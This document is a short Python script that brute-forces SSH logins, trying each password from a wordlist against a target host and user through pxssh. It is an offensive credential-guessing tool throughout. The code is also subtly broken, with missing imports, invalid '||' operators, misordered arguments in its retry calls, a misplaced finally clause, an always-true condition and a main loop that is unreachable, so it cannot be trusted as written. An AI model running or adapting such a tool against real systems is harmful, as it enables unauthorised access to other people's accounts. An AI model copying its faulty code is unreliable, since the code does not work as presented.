import optparse, pxssh, time
from threading import Thread 

max_connections = 10
con_lck = BoundedSemaphore(value=max_connections)
Found  = False
Fails  = 0

def connect(release,host,user,password):
	global Found
	global Fails

	try:
		sock = pxssh.pxssh()
		sock.login(host,user,password)
		print('[+]The password has been found' + password)
		Found = True
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(10)
			connect(host,user,password,False)
		elif 'syncronize with original prompt':
			time.sleep(5)
			connect(host,user,password,False)
		finally:
			if release: con_lck.release()


def main():
	parser = optparse.OptionParse('usage %prog -H <target host> -F <password list>')
	parser.add_option('-H', dest="tgtHost", type="string", help="Please specify the target host")
	parser.add_option('-F', dest="pswdlst", type="string", help="Please specify the password list to use")
	parser.add_option('-u', dest="user", type="string", help="Please specify the user profile")
	(options, args) = parser.parse_args()
	host = options.tgtHost
	user = options.user
	pswdList = options.pswdlst

	if host == None || pswdList == None || user == None:
		print(parser.usage)
		exit(0)
		fhd = open(pswdList, 'r')
		for line in fhd.readlines():
			if Found:
				print("[+] The password has been found")
				exit(0)
				if Fails > 5:
					print("Closing max socket timeouts reached")
					exit(0)
			con_lck.acquire()


if __name__ == "__main__":
	main()
